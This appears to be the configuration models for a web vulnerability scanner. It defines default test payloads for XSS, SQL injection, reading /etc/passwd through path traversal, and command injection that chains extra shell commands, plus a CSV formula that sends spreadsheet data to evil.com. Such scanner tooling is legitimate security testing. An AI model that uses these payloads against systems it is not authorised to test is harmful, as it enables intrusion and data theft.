from __future__ import annotations

from enum import Enum
from typing import Dict, List, Optional, Literal
from pydantic import BaseModel


class ScanMode(str, Enum):
    SAFE = "セーフ"
    NORMAL = "通常"
    ATTACK = "攻撃"


class VulnerabilityFinding(BaseModel):
    name: str
    severity: str
    evidence: Optional[str] = None
    reproduction_steps: Optional[List[str]] = None
    notes: Optional[str] = None
    feature_name: Optional[str] = None  # 機能名
    explanation: Optional[str] = None   # 解説
    impact: Optional[str] = None        # 想定される被害・影響
    remediation: Optional[str] = None   # 対策
    category: Optional[str] = None      # 分類（例: A, B, C...）
    test_type: Optional[str] = None     # 検査タイプ（能動的/受動的）
    element_selector: Optional[str] = None # 脆弱性に関連する要素のCSSセレクタ


class ScanResult(BaseModel):
    target: str
    mode: ScanMode
    endpoints: List[str]
    vulns_by_endpoint: Dict[str, List[VulnerabilityFinding]]


class AuthConfig(BaseModel):
    login_url: Optional[str] = None
    username: Optional[str] = None
    password: Optional[str] = None


class XSSOptions(BaseModel):
    enabled: bool = True
    param_name: str = "q"
    payload: str = "<xss>XSS</xss>"
    success_tokens: List[str] = ["XSS", "xss"]
    match_mode: Literal["contains", "regex"] = "contains"


class SQLIOptions(BaseModel):
    enabled: bool = True
    param_name: str = "id"
    baseline_value: str = "1"
    injection_template: str = "1 OR 1=1"
    error_signatures: List[str] = [
        "sql syntax",
        "you have an error in your sql syntax",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "ora-00933",
        "ora-01756",
        "mysql",
        "postgresql",
        "sqlite",
    ]


class ScanOptions(BaseModel):
    xss: XSSOptions = XSSOptions()
    sqli: SQLIOptions = SQLIOptions()
    class TraversalOptions(BaseModel):
        enabled: bool = False
        payload: str = "../../../../../../etc/passwd"
    traversal: "ScanOptions.TraversalOptions" = TraversalOptions()
    class BusinessLogicOptions(BaseModel):
        enabled: bool = True
        max_suggestions: int = 3
    business: "ScanOptions.BusinessLogicOptions" = BusinessLogicOptions()
    class UploadOptions(BaseModel):
        enabled: bool = False
        file_field_candidates: List[str] = ["file", "upload", "image", "avatar"]
        samples: List[tuple[str, str, str]] = [("mbsd.txt", "MBSD", "text/plain"), ("mbsd.jpg", "\xff\xd8\xff\xdb", "image/jpeg")]
    upload: "ScanOptions.UploadOptions" = UploadOptions()
    class CommandInjectionOptions(BaseModel):
        enabled: bool = False
        param_candidates: List[str] = ["cmd", "command", "exec", "ping", "host"]
        payloads: List[str] = ["test;invalidcmd12345", "test|invalidcmd12345", "`invalidcmd12345`"]
        error_signatures: List[str] = ["sh:", "bash:", "not found", "syntax error", "unexpected token"]
    cmdi: "ScanOptions.CommandInjectionOptions" = CommandInjectionOptions()
    class CSVI_Options(BaseModel):
        enabled: bool = True
        payloads: List[str] = [
            "=2+3",
            "@SUM(A1:A2)",
            '=HYPERLINK("http://evil.com?data=" & A1, "Click me")',
            ',=2+3',
            ';=2+3',
            '","=2+3',
            '";=2+3',
        ]
    csvi: "ScanOptions.CSVI_Options" = CSVI_Options()
    deep_scan: bool = False # For agent-based scanning
